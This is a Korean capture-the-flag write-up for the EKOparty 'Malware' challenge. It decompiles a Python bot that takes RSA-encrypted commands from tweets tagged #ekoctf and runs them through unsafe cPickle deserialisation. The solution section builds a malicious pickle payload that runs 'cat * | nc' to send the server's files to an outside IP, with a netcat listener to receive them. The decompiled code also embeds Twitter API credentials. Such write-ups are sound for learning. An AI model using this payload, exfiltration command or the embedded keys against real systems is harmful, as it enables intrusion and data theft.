============================================================================================================
[EKOparty] Malware
============================================================================================================

.. uml::
    
    @startuml

    start

    :디컴파일;

    :리펙토링;

    :소스 분석;

    :역수행;
    
    stop

    @enduml

|

디컴파일 (pyc -> py)
============================================================================================================

압축 파일을 다운 받은 뒤 풀어보니 pyc파일 형식입니다.

pyc를 `uncompyle2`_ 를 통해 디컴파일 해줍니다. 

.. _`uncompyle2`: https://github.com/wibiti/uncompyle2

디컴파일한 코드는 다음과 같습니다.

.. code-block:: python

    # Embedded file name: ekobot_final.py
    import os
    import sys
    import httplib2
    import cPickle
    from Crypto.PublicKey import RSA
    from base64 import b64decode
    from twython import Twython
    
    if 0:
        i11iIiiIii
        OO0o = 'ekoctf'
    
    if 0:
        Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o
    if len(sys.argv) != 2:
        os._exit(0)
        if 0:
            IiII1IiiIiI1/ iIiiiI1IiI1I1

    ##### 중략 #####

    IiIi[0:5] == 'eko11':
        cPickle.loads(IiIiIi[5:])
        os._exit(0)
        if 0:
            iii1II11ii.Oo.iIiiiI1IiI1I1.ii1I

        except Exception as OOooO:
            print str(OOooO)
            if 0:
                ii1II11I1ii1I+ ooO0OO000o % i11iIiiIii.o0oOoO00o - IiII1IiiIiI1

    oo(oo00)

|

리펙토링
============================================================================================================

디컴파일 코드 가독성을 높이기위해 변수명을 수정하고, 필요없는 코드(if 0:)들을 수정해줍니다.

.. code-block:: python

    import os
    import sys
    import httplib2
    import cPickle
    from Crypto.PublicKey import RSA
    from base64 import b64decode
    from twython import Twython

    if len(sys.argv) != 2:
        os._exit(0)

    input_file = sys.argv[1]

    def read_file1():
        input = 0
        if os.path.isfile(input_file):
            try:
                fileopen = open(input_file, 'r')
                input = int(fileopen.readline(), 10) 
            except:
                input = 0

        return input

    def main(twid):
        try:
            fileopen = open(input_file, 'w')
            fileopen.write(str(twid))
        except:
            print 'error'

    def response_data(url):
        httplist = httplib2.Http('')
        res_header, res_data = httplist.request(url, 'GET')
        if res_header.status == 200:
            try:
                if res_header['content-type'][0:10] == 'text/plain':
                    return res_data
                return 'Err'
            except:
                return 'Err'

        else:
            return url

    def dec(cipher_text):
        try:
            rsa_key = RSA.importKey(open('ekobot.pem').read())
            decode_data = b64decode(cipher_text)
            iiiI11 = rsa_key.decrypt(decode_data)
            return iiiI11
        except Exception as error_page:
            print str(error_page)
            return 'Err'

    twitter = Twython('ienmDwTNHZVR9si4SzeCg1glB', 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN', oauth_version=2)
    twitter_token = twitter.obtain_access_token() 
    twitter = Twython('ienmDwTNHZVR9si4SzeCg1glB', access_token=twitter_token)

    input = read_file1()
    searching = twitter.search(q='#ekoctf', rpp='250', result_type='mixed', since_id=input) 


    for status1 in searching['statuses']:
        if status1['id'] > input:
            input = status1['id']

        n = 0
        try:
            for hashtag1 in status1['entities']['hashtags']:
                if hashtag1['text'] == 'ekoctf':
                    n = 1

            if n == 1:
                for url1 in status1['entities']['urls']:
                    if os.fork() == 0:
                        decrypt = dec(response_data(url1['url']))
                        if decrypt[0:5] == 'eko11':
                            cPickle.loads(decrypt[5:])
                        os._exit(0)

        except Exception as error_page:
            print str(error_page)

    main(input)
 
|


소스 분석
============================================================================================================

이제 코드를 확인해보면 Twython이라는 모듈을 먼저 쓰고 있는걸 볼 수 있습니다. Twitter의 공식 API의 기본 래퍼를 파이썬으로 제작한 것입니다. 
코드 진행 순서는 다음과 같습니다.

- Twitter에 ekoctf 태그로 url부분에 대한 검색을 통해 content-type이 text/plain일 경우, reponse data를 추출

- 추출한 response data를 rsa private key ekobot.pem을 통해 복호화 진행

- 복호화한 데이터 header 값에 'eko11'이 있을 경우, 그 뒤 복호화한 데이터를 cPickle.loads을 통해 명령 실행

twitter를 통해 원하는 명령을 실행할 수 있는 프로그램 형태입니다. 
우선 Public Key를 알아야 해당 문제를 해결할 수 있기 때문에 twitter에서 #ekoctf로 검색을 하니 다음 주소에 Public Key가 있는 걸 확인할 수 있습니다. (https://twitter.com/NullLifeTeam/status/657208358408204288))

.. code-block:: text

    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmWw84H8BSPG1Ispn1hBP
    WZ4ORxniLhOl76aOAsGsqdRZJyL+PFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8
    WT6P4FRtK09UtDgqNUQdx49WBqDf2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K
    6bGdmSSBZjgc6MA4rJil7xdSVP5Pedb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ4
    8D+IoIU6bVWAkael+ftZtDWY43XkezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xo
    eEsP2p8L67qF48eUbxI1ukcrqdy0c92rSihmChGBmHQ2AREshtTTLpM24/Nrirje
    /QIDAQAB
    -----END PUBLIC KEY-----

|

역수행
============================================================================================================

이제 Public Key를 이용해 사용하고자 하는 명령을 RSA로 암호화하여 , twitter에 raw data 형식으로 글을 올리면 됩니다.

본 문서에서는 cat *|nc local_ip 8000 라는 명령을 통해 해당 서버 디렉토리에 파일들을 볼 수 있도록 하겠습니다. 여기서 주의할 점은 파일 명령 앞부분에 "eko11"을 넣어주어야 정상적으로 서버에서 복호화 진행이 될 수 있습니다.

.. code-block:: python

    from Crypto.PublicKey import RSA
    from base64 import b64decode,b64encode
     
    key=RSA.importKey(open('pub.pem').read())
    exploit="eko11"+"cos\nsystem\n(S'cat * | nc 182.70.222.238 8000'\ntR.'\ntR."
    txt=key.encrypt(exploit,32)[0]
    final=b64encode(txt)
    print final
 
그리고 local에서는 while true; do nc -l -n -v -p 8000 ; done 이라는 명령을 입력하고 기다리면 해당 서버 디렉토리 파일 내용을 확인할 수 있습니다.

